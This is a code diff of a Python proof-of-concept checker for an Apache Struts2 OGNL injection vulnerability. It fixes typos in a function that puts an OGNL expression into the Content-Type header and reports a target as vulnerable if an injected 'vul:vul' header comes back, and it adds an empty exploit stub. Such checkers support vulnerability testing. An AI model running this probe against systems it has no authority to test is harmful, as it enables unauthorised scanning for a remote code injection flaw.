@@ -25,11 +25,14 @@ def poc(url):
         url = 'http://' + url
     try:
         header["Content-Type"] = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vul','vul')}.multipart/form-data"
-        rsponse = requests.get(url, headers=header, timeout=5)
-        if "vul:vul" in reponse.text:
+        response = requests.get(url=url, headers=header, timeout=5)
+        if "vul:vul" in response.text:
             return True
         else:
             return False
     except Exception:
         return False
+
+def exp():
+    pass
 
